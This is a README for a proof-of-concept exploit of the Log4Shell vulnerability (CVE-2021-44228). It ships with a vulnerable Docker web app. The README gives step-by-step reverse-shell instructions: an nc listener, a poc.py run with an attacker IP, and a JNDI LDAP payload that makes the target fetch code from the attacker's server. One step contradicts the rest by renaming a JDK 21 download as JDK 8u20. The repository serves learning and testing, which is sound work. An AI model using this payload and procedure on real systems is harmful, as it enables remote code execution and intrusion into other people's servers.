# log4j-shell-poc
A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability. <br><br>
Recently there was a new vulnerability in log4j, a java logging library that is very widely used in the likes of elasticsearch, minecraft and numerous others.

In this repository there is an example vulnerable application and proof-of-concept (POC) exploit of it.

Proof-of-concept (POC)
----------------------

As a PoC there is a python file that automates the process. 

#### Requirements:
```bash
pip install -r requirements.txt
```
#### Usage:
(Note from Tyler - I re-wrote this because I found the original confusing.)

### Getting a Shell

1. Git clone this: https://github.com/kozmer/log4j-shell-poc 
2. Download this JDK: https://download.oracle.com/java/21/latest/jdk-21_linux-x64_bin.tar.gz 
3. Move it to the log4j directory created in step 1. 
4. Unzip it: `tar -xf jdk-21_linux-x64_bin.tar.gz` 
5. Rename it to `jdk1.8.0_20` 
6. Set up a NC listener on port 1337
7. Run the exploit: `python3 [poc.py](http://poc.py/) --userip 10.8.4.163 --webport 80 --lport 1337` 
8. Delete the Exploit.class
9. Re-compile the Exploit.class in the correct Java version: `javac -source 1.8 -target 1.8 Exploit.java` 
10. Send the payload: `%24%7Bjndi%3Aldap%3A%2F%2F10.8.4.163%3A1389%2Fa%7D` (needed to be URL encoded in this example)

Vulnerable application
--------------------------

There is a Dockerfile with the vulnerable webapp. You can use this by following the steps below:
```c
1: docker build -t log4j-shell-poc .
2: docker run --network host log4j-shell-poc
```
Once it is running, you can access it on localhost:8080

<br>

Getting the Java version.
--------------------------------------

Oracle thankfully provides an archive for all previous java versions:<br>
[https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html).<br>
Scroll down to `8u20` and download the appropriate files for your operating system and hardware.
![Screenshot from 2021-12-11 00-09-25](https://user-images.githubusercontent.com/46561460/145655967-b5808b9f-d919-476f-9cbc-ed9eaff51585.png)

**Note:** You do need to make an account to be able to download the package.

Once you have downloaded and extracted the archive, you can find `java` and a few related binaries in `jdk1.8.0_20/bin`.<br>
**Note:** Make sure to extract the jdk folder into this repository with the same name in order for it to work.

```
❯ tar -xf jdk-8u20-linux-x64.tar.gz

❯ ./jdk1.8.0_20/bin/java -version
java version "1.8.0_20"
Java(TM) SE Runtime Environment (build 1.8.0_20-b26)
Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode)
```

Disclaimer
----------
This repository is not intended to be a one-click exploit to CVE-2021-44228. The purpose of this project is to help people learn about this vulnerability, and perhaps test their own applications (however there are better applications for this purpose, ei: [https://log4shell.tools/](https://log4shell.tools/)).
